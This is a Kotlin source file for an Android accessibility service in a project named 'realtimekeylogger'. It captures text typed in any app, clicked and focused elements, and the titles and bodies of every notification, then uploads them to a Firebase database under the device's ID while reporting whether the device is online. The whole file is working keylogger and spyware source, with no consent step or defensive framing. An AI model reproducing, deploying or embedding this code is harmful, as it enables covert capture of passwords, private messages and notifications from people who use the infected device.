package com.shubhamgupta16.realtimekeylogger.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Notification
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.widget.Toast
import com.google.firebase.database.*
import com.shubhamgupta16.realtimekeylogger.utils.encode
import com.shubhamgupta16.realtimekeylogger.utils.getDeviceId
import com.shubhamgupta16.realtimekeylogger.utils.getDeviceName

class StrokeService : AccessibilityService() {

    val rtdb = FirebaseDatabase.getInstance().reference
    private var deviceKey: String = ""


    override fun onServiceConnected() {
        super.onServiceConnected()

        deviceKey = applicationContext.getDeviceId()

        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_FOCUSED or
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        info.notificationTimeout = 500
        info.packageNames = null
        serviceInfo = info


//        initialization
        val map: MutableMap<String, Any> = HashMap()
        map["name"] = getDeviceName()
        map["status"] = 1
        map["lastOnline"] = ServerValue.TIMESTAMP
        rtdb.child("devices").child(deviceKey).updateChildren(map)
        rtdb.child(".info/connected").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                Log.d("connection", snapshot.toString())
                val value = snapshot.getValue(Boolean::class.java)!!
                if (value) {
                    rtdb.child("devices").child(deviceKey).child("lastOnline")
                        .setValue(ServerValue.TIMESTAMP)
                    rtdb.child("devices").child(deviceKey).child("status").setValue(1)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
        rtdb.child("devices").child(deviceKey).child("lastOnline").onDisconnect()
            .setValue(ServerValue.TIMESTAMP)
        rtdb.child("devices").child(deviceKey).child("status").onDisconnect()
            .setValue(0)

        Toast.makeText(applicationContext, "Started", Toast.LENGTH_SHORT).show()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return



        if (event.eventType.let {
                it == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
                        it == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                        it == AccessibilityEvent.TYPE_VIEW_CLICKED
            }) {
            if (event.text.isNotEmpty() || event.contentDescription != null) {
                val eventText = event.text.joinToString { it }.ifBlank { null }
                sendEvent(
                    event.eventType, eventText, event.contentDescription
                )
            }
        } else if (event.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            val notification = event.parcelableData as? Notification
            val notifyMap = notification?.let {
                mapOf(
                    "nTitle" to notification.extras.getCharSequence(Notification.EXTRA_TITLE).encode(),
                    "nText" to notification.extras.getCharSequence(Notification.EXTRA_TEXT).encode(),
                    "nText2" to notification.extras.getCharSequence(Notification.EXTRA_BIG_TEXT).encode(),
                    "nPackage" to event.packageName.toString().encode()
                )
            }

            val eventText = event.text.joinToString { it }.ifBlank { null }
            val hashMap = hashMapOf(
                "text" to eventText.encode(),
                "desc" to event.contentDescription,
                "event" to event.eventType
            )
            notifyMap?.let { hashMap.putAll(it) }
            uploadEvent(hashMap)
        }
    }

    private var lastEventText = ""
    private var lastEventTimeStamp = 0L
    private var lastCurrentTime = 0L
    private var lastEventType = 1
    private fun sendEvent(event: Int, text: String?, desc: CharSequence?) {
        val currentTime = System.currentTimeMillis()
        if (lastEventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            if (text == null) return
            if (!text.contains(lastEventText) && !lastEventText.contains(text))
                lastEventTimeStamp = currentTime
            if (currentTime - lastCurrentTime > 1000 * 7) lastEventTimeStamp = currentTime
            if (text.length > 3 && lastEventText.length > 3)
                if (text.substring(3) == lastEventText.substring(3))
                    lastEventTimeStamp = currentTime
            lastCurrentTime = currentTime
            lastEventText = text
        } else {
            lastEventText = text ?: ""
            lastEventTimeStamp = currentTime
            lastCurrentTime = currentTime
        }
        lastEventType = event
        rtdb.child("actions_v2").child(deviceKey).child("$lastEventTimeStamp").setValue(mapOf(
            "text" to text.encode(),
            "desc" to desc.encode(),
            "event" to event
        ))
    }

    private fun uploadEvent(map: Map<String, Any?>, timeStamp: Long = System.currentTimeMillis()) {
        rtdb.child("actions_v2").child(deviceKey).child("$timeStamp").setValue(map)
    }

    override fun onInterrupt() {
        Log.d("TAG", "onInterrupt: called")
    }
}